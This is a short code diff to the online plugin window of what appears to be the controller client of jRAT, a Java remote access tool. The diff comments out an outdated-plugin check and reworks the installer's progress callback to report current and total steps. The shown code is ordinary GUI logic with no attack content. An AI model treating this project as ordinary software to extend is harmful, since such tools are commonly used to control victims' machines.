@@ -36,8 +36,6 @@ import pro.jrat.client.Constants;
 import pro.jrat.client.ErrorDialog;
 import pro.jrat.client.extensions.ExtensionInstaller;
 import pro.jrat.client.extensions.OnlinePlugin;
-import pro.jrat.client.extensions.Plugin;
-import pro.jrat.client.extensions.PluginLoader;
 import pro.jrat.client.listeners.ExtensionInstallerListener;
 import pro.jrat.client.net.WebRequest;
 import pro.jrat.common.Version;
@@ -100,13 +98,13 @@ public class FrameOnlinePlugins extends JFrame {
 				if (column == 0 && plugin != null) {
 					lbl.setIcon(plugin.getIcon());
 
-					if (plugin.isInstalled()) {
+					/*if (plugin.isInstalled()) {
 						Plugin realPlugin = PluginLoader.getPlugin(plugin.getDisplayName());
 
 						if (realPlugin != null && !plugin.getVersion().equals(realPlugin.getVersion())) {
 							setText("(Outdated) " + value);
 						}
-					}
+					}*/
 				} else if (column == 5) {
 					if (plugin == null) {
 						JButton btn = new JButton("?");
@@ -203,10 +201,17 @@ public class FrameOnlinePlugins extends JFrame {
 
 		final ExtensionInstaller installer = new ExtensionInstaller(plugin, new ExtensionInstallerListener() {
 			@Override
-			public void status(Color color, String message, int status) {
+			public void status(Color color, String message, int current, int total) {
 				lblStatus.setForeground(color);
 				lblStatus.setText(message);
-				progressBar.setValue(status);
+				progressBar.setValue(current);
+
+				if (total == -1) {
+					progressBar.setIndeterminate(true);
+				} else {
+					progressBar.setIndeterminate(false);
+					progressBar.setMaximum(total);
+				}
 			}
 		});
 
